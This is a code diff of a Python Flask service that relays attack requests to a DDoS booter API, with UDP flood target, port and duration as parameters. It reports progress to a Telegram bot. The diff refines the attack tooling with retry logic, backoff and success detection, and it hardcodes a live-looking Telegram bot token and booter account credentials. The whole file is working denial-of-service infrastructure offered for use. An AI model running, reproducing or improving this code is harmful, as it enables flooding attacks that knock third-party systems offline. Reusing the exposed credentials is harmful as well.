@@ -13,12 +13,10 @@ logger = logging.getLogger(__name__)
 
 # Telegram Bot Configuration
 BOT_TOKEN = "7951857029:AAGkVwayuNFbIK7b3SS6Ev0gZWdN0-bJb0E"
-
 CHAT_IDS = [
     "8523310365",
     "7646520243"
 ]
-
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
 def send_telegram_message(message):
@@ -35,7 +33,6 @@ def send_telegram_message(message):
             except:
                 pass
 
-
 # ==================== TARGET APIS ====================
 TARGET_APIS = [
     {"id": 6, "name": "API_6", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method=udp&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "last_used": None, "current_attack": None},
@@ -44,8 +41,6 @@ TARGET_APIS = [
     {"id": 9, "name": "API_9", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method=udp&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "last_used": None, "current_attack": None},
     {"id": 10, "name": "API_10", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method=udp&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "last_used": None, "current_attack": None},
 ]
-# ====================================================
-
 
 def get_response_summary(response, response_time):
     summary = f"Status: {response.status_code} | Time: {response_time}ms\n"
@@ -59,42 +54,67 @@ def get_response_summary(response, response_time):
         summary += f"Response: {text}"
     return summary
 
-
 def is_attack_successful(response):
+    """
+    Optimized for your current API[](http://38.87.116.24)
+    """
+    if not response:
+        return False
+
     try:
         data = response.json()
+        
+        # Direct checks
         if data.get('success') is True or data.get('error') is False:
             return True
-        msg = str(data.get('message', '')).lower()
-        if any(word in msg for word in ['launched', 'started', 'success', 'ok', 'sent']):
+        if data.get('error') is True:
+            return False
+
+        message = str(data.get('message', '')).lower()
+        success_keywords = ['launched', 'started', 'success', 'ok', 'sent', 'attack']
+        error_keywords = ['slot', 'busy', 'full', 'wait', 'limit', 'error', 'fail', 'denied']
+
+        if any(word in message for word in success_keywords):
             return True
-    except:
+        if any(word in message for word in error_keywords):
+            return False
+
+    except (ValueError, TypeError, AttributeError, KeyError):
         pass
 
+    # Fallback check
     if response.status_code == 200:
-        text = response.text.lower()
-        if not any(word in text for word in ['error', 'fail', 'slot', 'busy', 'limit']):
+        text = response.text.strip().lower()
+        if not text:
             return True
+        if any(word in text for word in ['slot', 'busy', 'full', 'wait', 'limit', 'error', 'fail']):
+            return False
+        return True
+
+    if response.status_code >= 400:
+        return False
+
     return False
 
-
 def send_attack(api, ip, port, duration, packet_len):
+    """Send attack with improved retry logic"""
     target_url = api['url'].format(ip=ip, port=port, time=duration, len=packet_len)
-    
+   
     max_retries = 8
     retry_count = 0
-    
+   
     while retry_count < max_retries:
+        attempt = retry_count + 1
         start_time = time.time()
-        
+       
         try:
-            response = requests.get(target_url, timeout=15)
+            response = requests.get(target_url, timeout=18)   # Improved timeout
             response_time = int((time.time() - start_time) * 1000)
-            
+           
             response_summary = get_response_summary(response, response_time)
-            
+           
             telegram_msg = f"""
-🔵 <b>ATTACK REQUEST #{retry_count+1}</b>
+🔵 <b>ATTACK REQUEST #{attempt}/{max_retries}</b>
 ├ API: {api['name']}
 ├ Target: {ip}:{port}
 ├ Duration: {duration}s
@@ -105,7 +125,7 @@ def send_attack(api, ip, port, duration, packet_len):
 {response_summary}
 """
             send_telegram_message(telegram_msg)
-            
+           
             if is_attack_successful(response):
                 send_telegram_message(f"""
 ✅ <b>ATTACK SUCCESSFULLY STARTED</b>
@@ -114,6 +134,7 @@ def send_attack(api, ip, port, duration, packet_len):
 ├ Duration: {duration}s
 ├ Len: {packet_len}
 ├ Response Time: {response_time}ms
+├ Attempt: {attempt}/{max_retries}
 """)
                 time.sleep(duration)
                 send_telegram_message(f"""
@@ -123,24 +144,26 @@ def send_attack(api, ip, port, duration, packet_len):
 ├ Duration: {duration}s
 """)
                 return {'success': True}
-            
+           
             else:
                 retry_count += 1
-                time.sleep(2)
-                
+                if retry_count < max_retries:
+                    time.sleep(2)
+               
         except Exception as e:
             retry_count += 1
             response_time = int((time.time() - start_time) * 1000)
             send_telegram_message(f"""
-⚠️ <b>REQUEST FAILED</b> (Attempt {retry_count}/{max_retries})
+⚠️ <b>REQUEST FAILED</b> (Attempt {attempt}/{max_retries})
 ├ API: {api['name']}
 ├ Target: {ip}:{port}
 ├ Error: {str(e)[:180]}
 ├ Time: {response_time}ms
 """)
             if retry_count < max_retries:
-                time.sleep(2)
-    
+                time.sleep(min(2 ** retry_count, 10))  # Exponential backoff
+
+    # All retries failed
     send_telegram_message(f"""
 💀 <b>ALL RETRIES FAILED</b> on {api['name']}
 ├ Target: {ip}:{port}
@@ -148,11 +171,10 @@ def send_attack(api, ip, port, duration, packet_len):
 """)
     return {'success': False}
 
-
 def execute_attack(api, ip, port, total_time, packet_len):
     api['busy'] = True
     api['current_attack'] = {'ip': ip, 'port': port, 'time': total_time, 'len': packet_len}
-    
+   
     send_telegram_message(f"""
 🚀 <b>NEW ATTACK QUEUED</b>
 ├ API: {api['name']}
@@ -160,15 +182,14 @@ def execute_attack(api, ip, port, total_time, packet_len):
 ├ Time: {total_time}s
 ├ Len: {packet_len}
 """)
-    
+   
     result = send_attack(api, ip, port, total_time, packet_len)
-    
+   
     api['busy'] = False
     api['current_attack'] = None
-    
+   
     status = "✅ SUCCESS" if result['success'] else "💀 FAILED"
     send_telegram_message(f"{status} | {api['name']} → {ip}:{port} ({total_time}s)")
-
 
 @app.route('/attack/start', methods=['GET'])
 def start_attack():
@@ -176,31 +197,30 @@ def start_attack():
     port = request.args.get('port')
     time_param = request.args.get('time')
     len_param = request.args.get('len', '500')
-    
+   
     if not all([ip, port, time_param]):
         return jsonify({'error': 'Missing ip, port, or time'}), 400
-    
+   
     try:
         port = int(port)
         total_time = int(time_param)
         packet_len = int(len_param)
-        if total_time <= 0 or packet_len <= 0:
+        if total_time <= 0 or packet_len <= 0 or total_time > 3600:
             raise ValueError
     except ValueError:
         return jsonify({'error': 'Invalid parameters'}), 400
-    
-    # FIXED: TARGET_APIS is now properly defined above
+   
     selected_api = next((api for api in TARGET_APIS if not api['busy']), None)
-    
+   
     if not selected_api:
         return jsonify({'error': 'All APIs are busy'}), 503
-    
+   
     threading.Thread(
         target=execute_attack,
         args=(selected_api, ip, port, total_time, packet_len),
         daemon=True
     ).start()
-    
+   
     return jsonify({
         'success': True,
         'api': selected_api['name'],
@@ -209,7 +229,6 @@ def start_attack():
         'len': packet_len
     })
 
-
 @app.route('/status', methods=['GET'])
 def status():
     return jsonify({
@@ -217,10 +236,9 @@ def status():
         'busy': [api['name'] for api in TARGET_APIS if api['busy']]
     })
 
-
 if __name__ == '__main__':
     print("="*70)
-    print("🚀 ATTACK API READY (Full Response + Time + Retry)")
+    print("🚀 ATTACK API READY (Improved Retry + Timeout)")
     print("Endpoint: /attack/start?ip=...&port=...&time=...&len=...")
     print("="*70)
     app.run(host='0.0.0.0', port=8080, threaded=True)
